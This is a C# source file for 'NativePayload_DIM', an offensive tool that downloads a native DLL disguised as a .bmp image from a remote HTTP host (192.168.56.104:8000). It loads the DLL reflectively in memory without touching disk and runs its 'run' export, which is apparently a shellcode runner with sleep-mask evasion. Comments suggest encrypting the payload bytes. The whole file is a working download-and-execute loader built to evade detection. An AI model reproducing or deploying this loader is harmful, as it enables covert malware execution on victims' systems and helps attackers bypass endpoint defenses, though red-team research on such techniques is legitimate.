using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;


namespace NativePayload_DIM
{
    internal class Program
    {
      
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate int _RunNativeDelegate();
       
        // [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        // private delegate int _ReverseNative_Delegate(int time, int pid);                      
        
        static void Main(string[] args)
        {
            try
            {
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.WriteLine("NativePayload_DIM , Published by Damon Mohammadbagher , May 2023");
                Console.ForegroundColor = ConsoleColor.Gray;
                Console.WriteLine("NativePayload_DIM Dynamic native dll Injection in Memory , Injecting Native DLL bytes to local Process");
                Console.WriteLine();
                /// method 1: using resource to load bytes of Native DLL/exe (Unmanaged Code) from Memory without creating dll file in disk.
                /// you can encrypt this bytes here and decrypt before run in memory and ...
                // byte[] DynDLL_Bytes1 = Resource1.NativeCode_SleepMask;

                /// method 2: using this method to load bytes of Native DLL from remote system and load DLL Bytes in-memory without write dll in disk.
                /// note: "NativeCode_SleepMask.bmp" in fact is "NativeCode_SleepMask.dll", so you can change bmp to dll or rename extension dll to bmp
                using (MemoryModule.MemoryModule DynDLL_Bytes2 = new MemoryModule.MemoryModule(
                    new System.Net.WebClient().DownloadData(
                        "http://192.168.56.104:8000/NativeCode_SleepMask.bmp")))              
                {
                    _RunNativeDelegate _DowloadShellCode_RUN_via_Sleepmask = 
                        (_RunNativeDelegate)DynDLL_Bytes2.GetDelegateFromFuncName("run", 
                        typeof(_RunNativeDelegate));
                    Console.WriteLine("[>] Native Code Executed in memory {0}", _DowloadShellCode_RUN_via_Sleepmask());                   
                }
            }
            catch (Exception error)
            {
                Console.WriteLine("error: " + error.Message);
            }
        }
    }
}
